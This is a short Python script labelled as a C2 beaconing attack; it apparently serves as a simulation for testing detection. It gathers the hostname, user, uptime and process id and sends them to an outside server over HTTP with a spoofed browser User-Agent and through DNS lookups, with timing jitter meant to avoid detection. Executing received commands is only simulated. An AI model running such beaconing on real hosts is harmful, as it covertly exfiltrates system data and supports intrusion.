#!/usr/bin/env python3
"""Attack: C2 beaconing — periodic check-ins to a command server, disguised as API calls."""
import time, random, urllib.request, json, subprocess, os

C2_SERVER = os.environ.get("C2_SERVER", "http://httpbin.org/post")
BEACON_INTERVAL = int(os.environ.get("C2_INTERVAL", "30"))

def beacon():
    """Send system info to C2, receive 'commands'."""
    try:
        info = {
            "hostname": subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip(),
            "uptime": open("/proc/uptime").read().split()[0],
            "user": os.environ.get("USER", "unknown"),
            "pid": os.getpid(),
        }
        payload = json.dumps(info).encode()
        req = urllib.request.Request(C2_SERVER, data=payload, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        # Simulate receiving and executing commands
        resp_data = resp.read()
    except Exception:
        pass

def beacon_dns():
    """DNS-based C2 beaconing."""
    import socket
    try:
        # Simulate DNS C2 by resolving encoded hostnames
        hostname = subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip()
        socket.getaddrinfo(f"{hostname[:10]}.example.com", 443)
    except Exception:
        pass

def run():
    print("[Attack] C2 beaconing started")
    while True:
        random.choice([beacon, beacon_dns])()
        # Jitter to avoid detection
        jitter = random.uniform(0.5, 1.5)
        time.sleep(BEACON_INTERVAL * jitter)

if __name__ == "__main__":
    run()
